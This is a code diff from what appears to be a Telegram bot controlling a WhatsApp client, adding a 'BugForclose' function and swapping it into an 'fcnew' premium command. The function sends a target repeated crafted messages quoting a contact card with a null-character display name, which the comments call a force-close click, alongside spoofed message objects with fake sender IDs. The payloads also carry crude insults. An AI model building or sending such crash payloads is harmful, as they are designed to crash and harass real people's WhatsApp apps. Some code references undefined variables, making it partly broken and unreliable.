@@ -290,6 +290,22 @@ const loadUserActivity = () => {
     }
 };
 
+const fkontak = {
+			key: {
+				remoteJid: '0@s.whatsapp.net',
+				participant: '0@s.whatsapp.net',
+				fromMe: false,
+				id: 'Naze'
+			},
+			message: {
+				
+				Message: {
+					displayName: `ranz`,
+					vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${m.pushName || author},;;;\nFN:${m.pushName || author}\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
+					sendEphemeral: true
+				}
+			}
+		}
 // --- Middleware untuk Mengecek Mode Maintenance ---
 const checkMaintenance = async (ctx, next) => {
     let userId, userNickname;
@@ -1404,7 +1420,7 @@ bot.command("fcnew", checkWhatsAppConnection, checkPremium, async ctx => {
   await prosesrespone(target, ctx);
 
   for (let i = 0; i < 3; i++) {
-    await sendBugKontak(target)
+    await BugForclose(target)
     
 }
 
@@ -2001,57 +2017,46 @@ target,
 }
 );
 }
-async function sendBugKontak(target, from) {
-  const message = {
-    extendedTextMessage: {
-      text: "Memek",
-      contextInfo: {
-        stanzaId: generateMessageID(),
-        participant: from,
-        quotedMessage: {
-          contactMessage: {
-            displayName: "@tamainfinity",
-            vcard: BEGIN:VCARD
-VERSION:3.0
-FN:@tamainfinity
-X-WA-BIZ-NAME:@tamainfinity
+//quoted FC click, Created by Xnr Team
 
-ORG:@tamainfinity;
-TEL;type=CELL;type=VOICE;waid=5521992999999:+55 21 99299-9999
-END:VCARD
-          }
-        }
-      }
-    }
-  };
-
-  await kipop.relayMessage(from, message, {});
+const qfc = {
+  key: {
+    remoteJid: m.chat,
+    participant: '5521992999999@s.whatsapp.net',
+    fromMe: false,
+    id: '5C69C796B2EA343ED905B6BEFDAFEBBB'
+  },
+message: {
+extendedTextMessage: {
+text: "Lezz The Good boy"
 }
-async function BugKontak(target) {
-  const message = {
-    extendedTextMessage: {
-      text: "Memek",
-      contextInfo: {
-        stanzaId: target,
-        participant: target,
-        quotedMessage: {
-          contactMessage: {
-            displayName: "@tamainfinity",
-            vcard: BEGIN:VCARD
-VERSION:3.0
-FN:@tamainfinity
-X-WA-BIZ-NAME:@tamainfinity
+}
+}
 
-ORG:@tamainfinity;
-TEL;type=CELL;type=VOICE;waid=5521992999999:+55 21 99299-9999
-END:VCARD
-          }
-        }
-      }
+/*
+- LINK GROUP XNR
+https://chat.whatsapp.com/I24OwNUuBzk6KRDeNDF62e
+
+THX TO OM TAMA, KARENA DIA SAYA MENDAPATKAN SEBUAH IDE TENTANG QUOTED INI
+*/
+async function BugForclose(target) {
+    for (let i = 0; i < 5; i++) {
+        await kipop.relayMessage(target, {
+            "extendedTextMessage": {
+                "text": "Hai Sayang🦍",
+                "contextInfo": {
+                    "stanzaId": generateMessageID(),
+                    "participant": target,
+                    "quotedMessage": {
+                        "contactMessage": {
+                            "displayName": "\u0000",
+                            "vcard": "BEGIN:VCARD\nVERSION:3.0\nFN:Reyhan6610\nX-WA-BIZ-NAME:Reyhan6610\n\nORG:Reyhan6610;\nTEL;type=CELL;type=VOICE;waid=5521992999999:+55 21 99299-9999\nEND:VCARD"
+                        }
+                    }
+                }
+            }
+        }, {})
     }
-  };
-
-  await kipop.relayMessage(from, message, {});
 }
 async function bulldozer(isTarget) {
   let message = {
